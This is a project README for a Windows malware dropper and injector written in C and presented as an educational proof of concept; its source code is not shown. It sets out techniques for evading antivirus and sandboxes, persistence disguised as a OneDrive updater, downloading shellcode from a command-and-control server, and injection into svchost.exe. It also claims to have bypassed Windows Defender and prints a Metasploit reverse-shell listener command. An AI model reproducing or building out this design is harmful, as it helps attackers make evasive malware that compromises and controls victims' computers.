# fr33d - C-Based Dropper & Injector (PoC)

This project is a **Proof of Concept (PoC)** of a modular dropper written in C, designed for educational purposes and for the study of advanced evasion and code injection techniques in Windows environments. The implant is structured to evade static and dynamic analysis by Windows Defender.

> ⚠️ **Disclaimer**: For educational purposes only. The use of this code for malicious or illegal purposes is strictly prohibited. The developer assumes no responsibility for the misuse of this material. Test only in isolated, authorized, and controlled environments (Sandbox/Lab).

---

## 🚀 Advanced Features

### 1. Static Evasion and Obfuscation
- **API Hashing (DJB2)**: No direct calls to Windows APIs in the Import Address Table (IAT). Functions are resolved at runtime via string name hashing.
- **XOR String Encryption**: All sensitive strings (DLL names, target processes, registry keys) are encrypted via XOR with a dynamic key and decrypted only in the stack right before use.
- **OPSEC**: All sensitive strings are re-encrypted immediately after use.
- **Binary Stripping**: The executable is stripped of debug symbols and metadata during compilation.

### 2. Dynamic Evasion
- **Anti-Sandboxing**: Hardware resource checks to detect execution in virtual machines or constrained analysis environments.
- **Smart Delay**: A "smart" calculation loop to bypass sandbox wait times without using the `Sleep()` function.
- **Polymorphism**: The Python weaponization script generates a unique SHA-256 hash for each build by appending random bytes in the overlay at the end of the file.

### 3. Persistence and Control
- **Identifying Mutex**: Checks for the presence of a unique (encrypted) Mutex to prevent multiple redundant executions on the same host.
- **Auto-Persistence**: Copies itself into the `%APPDATA%` folder with a legitimate-looking name (`OneDrive_Updater.exe`) and ensures startup at boot via Windows registry.

### 4. Process Injection & Networking
- **Modular Downloader**: Uses WinINet to download the encrypted shellcode/payload from a remote C2 server.
- **Stealth Injection**: Injects shellcode into system processes (`svchost.exe`).

---

## 🛠️ Project Architecture

```text
.
├── code/
│   ├── main.c           # Entry point and core logic
│   ├── evasion.c        # Anti-VM, Hashing, XOR, Mutex
│   ├── network.c        # Payload download manager
│   ├── injection.c      # Injection logic (Remote Thread)
│   ├── persistence.c    # Persistence installation and registry
│   ├── config.h         # Definitions and constants
│   └── ...              # Header files
├── helper/
│   ├── mutator.py       # Polymorphic builder and stripping
│   └── hasher.py        # DJB2 hash generator for APIs
└── README.md
```

---

## 🔨 Compilation and Weaponization

The project requires the `mingw-w64` cross-compiler on Linux.

```
# Code not yet available
```

---

## 🔬 Laboratory Testing

The implant was successfully tested on **Windows 11 (23H2)**, bypassing standard Windows Defender signatures for loading Meterpreter (HTTP) shellcode injected into suspended `svchost.exe` processes.

```
# Example of Metasploit listener on Kali
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <attacker_ip>; set LPORT <attacker_port>; exploit"
```
